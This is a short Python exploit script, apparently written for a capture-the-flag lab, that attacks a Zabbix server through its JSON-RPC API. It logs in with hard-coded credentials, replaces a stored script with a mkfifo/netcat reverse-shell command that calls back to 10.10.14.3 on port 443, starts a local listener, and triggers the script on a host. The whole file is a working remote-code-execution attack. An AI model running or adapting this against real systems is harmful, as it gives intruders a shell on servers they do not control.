import requests
import json
import time
import subprocess

proxies = {'http':'127.0.0.1:8080'}

# Login
authJSON = {
    "jsonrpc" : "2.0",
    "method" : "user.login",
    "params": {
        'user': "zapper",
        'password': "zapper",
},
    "auth" : None,
    "id" : 0,
}

headers = {
    'content-type': 'application/json-rpc',
}

url = "http://10.10.10.108/zabbix/api_jsonrpc.php"

response = requests.post(url, data=json.dumps(authJSON), proxies=proxies, headers=headers)

# Get response in json
auth = response.json()

# Get token
authToken = auth['result']

print(authToken)

# Update script
updateJSON = {
    "jsonrpc":"2.0",
    "method":"script.update",
    "id":0,
    "auth":authToken,
    "params":
        {"scriptid": 1, "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f"}
    }

response = requests.post(url, data=json.dumps(updateJSON), proxies=proxies, headers=headers)

# print(response.text)

# Executing script
executeJSON = {
    "jsonrpc":"2.0",
    "method":"script.execute",
    "id":0,
    "auth":authToken,
    "params":
        {"hostid": 10106, "scriptid": 4, "execute_on":"0"}
    }

# nc_listener = subprocess.Popen(["echo", perlShell, "|","nc","-nvlp","443"])
nc_listener = subprocess.Popen(["nc","-nvlp","443"])
time.sleep(1)

response = requests.post(url, data=json.dumps(executeJSON), proxies=proxies, headers=headers)
